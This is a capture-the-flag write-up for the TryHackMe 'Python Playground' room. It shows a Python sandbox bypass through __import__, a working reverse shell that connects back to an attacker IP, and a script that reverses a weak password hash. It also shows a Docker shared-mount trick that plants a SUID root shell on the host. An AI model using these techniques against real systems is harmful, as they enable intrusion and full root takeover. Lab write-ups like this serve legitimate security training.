---
title: "TryHackMe: Python Playground Writeup"
date: 2020-10-14T17:17:55+02:00
tags: []
description: "Sandboxing is a sound security concept if done right. This is not one of those instances."
draft: true
images: []
---

[Python Playground](https://tryhackme.com/room/pythonplayground) is a room over at [TryHackMe](https://tryhackme.com/) with a hard difficulty rating. A new service called "Python Playground" is on the market and it offers safe code execution in a sandboxed cloud environment. The security measures are patchy at best and able to connect an intruder to the Docker container that hosts the website at worst. From there, all that's required is a bit of enumeration and programming to get access to the host machine and to escalate privileges all the way to root.

<!--more-->

### Enumeration

A port scan reveals an open SSH port and a webserver hosting a static website. The website promotes a sandboxed Python environment but it's not immediately clear if and when one might be able to take them up on their lucrative business practice. The signup and login forms are not functional and there are no hints in the page source for hidden API endpoints.

{{< figure src="/images/thm/python/index.png" alt="Python playground homepage explaining the service they offer" caption="Python playground homepage, almost taunting to find a serious vulnerability" >}}

Gobuster then reveals a new page called `admin.html` which just so happens to offer a login form for one of the site's admins: Connor. It turns out he's not one to hide his secrets well since the JavaScript on the page reveals how to access the hidden sandbox environment. It hashes the entered password and compares the result with a hash of what I presume to be Connor's password. If it matches, the user is redirected to another hidden site which is presented in clear text in the page's source code. I'm going to talk about the "hash" function a little bit later. For now, let's see what we're presented with when we follow the redirect to the hidden admin testing panel.

### Sandboxing done wrong

It's a text box with an output area below. I quickly figured that I might be able to enter arbitrary Python code and get a result back. A simple `print("Hello")` returned `Hello` back to me. That's proof enough for me that I should be able to run any code I want.

{{< figure src="/images/thm/python/sandbox.png" alt="Python sandbox used to print a string to the output panel" caption="Python sandbox in action" >}}

Connor is smart though. He knows not to trust any arbitrary input. Importing any library with the `import` statement raises a security error. That means I couldn't just import `subprocess` and `os` to use their functions to execute on the remote host.

Python offers [built-in functions](https://docs.python.org/3/library/functions.html) that are available to the programmer without importing any libraries. Their features are quite limited but it showed that I could, at the very least, open and write arbitrary files with the `open` function. More importantly however, there's also a function called `__import__` which is called whenever an `import` statement is processed. I tried it out and it turns out Connor didn't think far enough to blacklist this function as well, so I can import any library I want with a little bit of extra code.

```python
sp = __import__("subprocess", globals(), locals(), [], 0)
sc = __import__("socket", globals(), locals(), [], 0)
o = __import__("os", globals(), locals(), [], 0)

s = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
s.connect(("###.###.###.###", 4444)) # your local ip goes here
o.dup2(s.fileno(), 0)
o.dup2(s.fileno(), 1)
o.dup2(s.fileno(), 2)

p = sp.call(["/bin/sh", "-i"])
```

This is your standard [Python reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), adapted to work with the limitations that the sandbox imposes. I opened up a netcat listener on my local machine and was promptly taken into the guts of the web application. Not only that, but we're root. (Or are we?) The first flag hides in plain sight in the `/root` directory.

```text
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [###.###.###.###] from (UNKNOWN) [###.###.###.###] 36270
/bin/sh: 0: can't access tty; job control turned off
# id; pwd;
uid=0(root) gid=0(root) groups=0(root)
/root/app
# cd /root
# ls -al
total 40
drwx------ 1 root root 4096 May 16 06:04 .
drwxr-xr-x 1 root root 4096 May 16 06:06 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
drwx------ 3 root root 4096 May 16 06:04 .config
drwxr-xr-x 4 root root 4096 May 16 06:04 .npm
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 1 root root 4096 May 16 06:04 app
-rw-rw-r-- 1 root root   38 May 16 04:55 flag1.txt
# cat flag1.txt
THM{################################}
```

### One step back, two steps forward

The `.dockerenv` file in the root directory shows that we're inside a Docker container. I spent quite a lot of time enumerating the file system in the hopes of finding an easy way out, but there was nothing to be found except what I presumed to be a mounted directory in `/mnt/log`. Again, this'll come in handy later. But I decided to take a step back and have another look around.

The script I mentioned that's responsible for checking the entered credentials on the admin login page has a sizable flaw to it. You can barely call the outcome of the functions that are applied to the password a hash, since it can be easily reversed. The "hash" is right there and the source code is unobfuscated, so I implemented the inverse of every function in JavaScript and ran the password hash through it.

```js
// if you understood it this far, you'll have no issues locating the hash
let hash = "################################";

const str2intarr = (txt) => {
    let arr = [];

    for (let i = 0; i < txt.length; i++) {
        arr.push(txt.charCodeAt(i) - 97);
    }

    return arr;
}

const intarr2txt = (arr) => {
    let txt = "";

    for (let i = 0; i < arr.length / 2; i++) {
        let p1 = arr[i * 2];
        let p2 = arr[i * 2 + 1];

        txt += String.fromCharCode(p1 * 26 + p2);
    }

    return txt;
}

console.log(intarr2txt(str2intarr(intarr2txt(str2intarr(hash)))));
```

The result is the password to Connor's little Python sandbox. Not only that, but it can also be used to connect to the host via SSH. The second flag is located in his home directory.

```text
kali@kali:~$ ssh -l connor python.thm
Warning: Permanently added the ECDSA host key for IP address '###.###.###.###' to the list of known hosts.
connor@python.thm's password: 

Last login: Sat May 16 06:01:55 2020 from ###.###.###.###
connor@pythonplayground:~$ id; pwd;
uid=1000(connor) gid=1000(connor) groups=1000(connor)
/home/connor
connor@pythonplayground:~$ ls -al
total 36
drwxr-xr-x 4 connor connor 4096 May 16 06:05 .
drwxr-xr-x 3 root   root   4096 May 11 22:10 ..
-rw-r--r-- 1 connor connor  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 connor connor 3789 May 11 22:16 .bashrc
drwx------ 2 connor connor 4096 May 11 22:15 .cache
-rw-rw-r-- 1 connor connor   38 May 16 02:40 flag2.txt
drwx------ 3 connor connor 4096 May 11 22:15 .gnupg
-rw-r--r-- 1 connor connor  807 Apr  4  2018 .profile
-rw-rw-r-- 1 connor connor   40 May 11 22:19 .vimrc
connor@pythonplayground:~$ cat flag2.txt
THM{################################}
```

### Reach for root from the other side

Again, I spent a lot of time enumerating the host. It was clear to me that this machine hosts the Docker container that, in turn, hosts the website that is susceptible to what could very, very loosely be described as a "Python sandbox escape". But remember the mount point in the container? It turns out that `/var/log` on the host and `/mnt/log` in the container are shared.

```text
connor@pythonplayground:/var/log$ ls -1
alternatives.log
apt
auth.log
bootstrap.log
btmp
cloud-init.log
[...and so on]

# pwd; ls -1
/mnt/log
alternatives.log
apt
auth.log
bootstrap.log
btmp
cloud-init.log
[...and so on]
```

The `/var/log` directory and its contents are owned by `root` so there's no way Connor would be able to add or edit any files in there. However, I am `root` in the container and a quick look at `ps aux` in the host machine verifies that the Docker container is actually executed by the `root` user. I attempted to create a file in the `/mnt/log` directory inside the container and check its permissions and content on the host side.

```text
# echo "Hello" > test.txt

connor@pythonplayground:/var/log$ ls -l test.txt
-rw-r--r-- 1 root root 6 Oct 14 18:36 test.txt
connor@pythonplayground:/var/log$ cat test.txt
Hello
```

Cool. The file I created within the container is owned by `root` on the host system. Now there's many ways to go about obtaining a shell as `root`. I wrote myself a tiny C program that pops a shell in the same way you've seen it in every binary exploitation challenge ever. I compiled it inside the container and set the SUID bit so it ran on behalf of the `root` account.

```text
# echo 'int main() { setuid(0); system("/bin/sh"); }' > hax.c
# gcc hax.c -o hax
hax.c: In function ‘main’:
hax.c:1:14: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    1 | int main() { setuid(0); system("/bin/sh"); }
      |              ^~~~~~
hax.c:1:25: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    1 | int main() { setuid(0); system("/bin/sh"); }
      |                         ^~~~~~
# chmod u+s hax

connor@pythonplayground:/var/log$ ./hax
# id; pwd;
uid=0(root) gid=1000(connor) groups=1000(connor)
/var/log
# cd /root
# ls -al
total 36
drwx------  5 root root 4096 May 16 06:06 .
drwxr-xr-x 24 root root 4096 May 11 22:05 ..
-rw-r--r--  1 root root 3122 May 11 22:26 .bashrc
drwx------  2 root root 4096 May 12 00:51 .cache
-rw-r--r--  1 root root   38 May 11 23:37 flag3.txt
drwx------  3 root root 4096 May 12 00:51 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 11 22:10 .ssh
-rw-r--r--  1 root root   40 May 11 22:27 .vimrc
# cat flag3.txt
THM{################################}
```

The third and final flag is contained in the `/root` directory of the host machine.

### Conclusion

All in all, this room wasn't too hard at all. As I read through the existing writeups, I found that people came up with a lot of different solutions and I think that's really cool. And since the room's description is "Be creative!", I believe there's still a lot of ways one could've gone about the sloppy sandboxing for instance. Python's arsenal of modules surely leaves up a lot of opportunities here. Thanks to [deltatemporal](https://tryhackme.com/p/deltatemporal) for this little challenge.